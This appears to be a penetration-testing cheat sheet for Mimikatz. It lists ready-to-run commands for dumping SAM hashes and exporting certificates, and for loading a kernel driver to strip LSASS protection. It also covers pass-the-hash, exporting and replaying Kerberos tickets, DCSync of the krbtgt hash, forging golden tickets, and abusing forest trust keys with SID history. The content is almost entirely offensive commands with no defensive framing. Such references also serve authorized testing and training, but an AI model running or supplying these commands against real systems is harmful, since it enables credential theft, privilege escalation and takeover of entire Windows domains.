# Mimikatz

## SAM File - Local accounts

```csharp
mimikatz # privilege::debug Privilege
mimikatz # lsadump::SAM /SAM:C:\Users\b3v1l\Desktop\SAM /SYSTEM:C:\Users\b3v1l\Desktop\SYSTEM
```

```csharp
lsadump::sam /system:C:\Users\b3v1l\Documents\test\sam\system /sam:C:\Users\b3v1l\Documents\test\sam\sam
```

![](../../../.gitbook/assets/image%20%28309%29.png)

## Export Certificats

```csharp
mimikatz# crypto::capi
mimikatz# privilege:debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

## Disable LSASS protection

### Manually

* Upload mimidrv.sys on the target
* Create a service task

```csharp
sc create mimidrv binpath= C:\temp\mimidrv.sys type= kernel start= demand
```

* Start the task

```csharp
sc start mimidrv
```

* Then, using mimikatz

```csharp
!processprotect /process:lsass.exe /remove
```

### Full mimikatz version

* Copy the mimikatz and sys driver on the disk
* Start mimikatz and load the driver. Disable Lsass protection

```csharp
privilege::debug
!+
!processprotect /process:lsass.exe /remove
```

## Pass the Hash

```csharp
Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:test.lab.local /ntlm:b38ff50
264bc43012185d82c69794a4d8 /run:powershell.exe"'
```

## Kerberos Tickets

### List tickets

```csharp
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

### Export tickets

```text
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### Pass the Ticket

```csharp
Invoke-Mimikatz -Command '"kerberos::ptt [0;9eaea]-2-0-60a10000-administrator@krbtgt-HOME.LAB.COM.kirbi"'
```

### Golden Ticket

#### Dcsync using a priv account on the dc 

```csharp
lsadump::dcsync /domain:target.domain.com /user:prod\krbtgt
```

#### Use krbtgt to impersonate anyone on the domain

```csharp
 kerberos::golden /user:Administrator /domain:target.domain.com /sid:S-1-5-21-634106289-36255656793-12345407 /id:500 /group/512 /krbtgt=dfdsfwefdccfbb7cc8eeadf7ce1 /startoffset=0 /endin=600 /renewmax:10080 /ptt
```

## DSync

{% hint style="info" %}
Replace /user:Domain\krbtgt by any username to get a specific hash
{% endhint %}

```csharp
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:Domain\krbtgt"'
```

## Trust Key between Forest and Child

### Get the trusted key

```csharp
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.lab.test.local
```

### Get a ticket

```csharp
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:childomain.com /sid:<childomain.com SID> /sids:<main domain SID-519> /rc4:ea9815a
<trusted key hash> /service:krbtgt /target:maindomain.com /ticket:C:\temp\trust_tkt.kirbi"'
```

### Pass the ticket - SID history

```csharp
 Invoke-Mimikatz -Command '"kerberos::ptt krbtgt_tkt.kirbi"'
```

